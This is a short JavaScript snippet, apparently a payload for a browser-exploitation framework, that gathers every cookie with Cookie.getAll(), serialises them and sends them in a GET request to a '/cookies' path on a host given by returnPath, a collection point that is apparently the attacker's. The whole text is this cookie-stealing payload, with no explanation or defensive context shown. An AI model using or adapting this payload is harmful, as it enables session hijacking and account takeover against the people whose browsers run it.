
function done(a,b)	{console.log(b);}

ck = Cookie.getAll()
var req = {
	"method":"GET",
	"target":returnPath["target"],
	"resource":"/cookies?" + Data.serialize(ck)
};
Network.request(req,done);
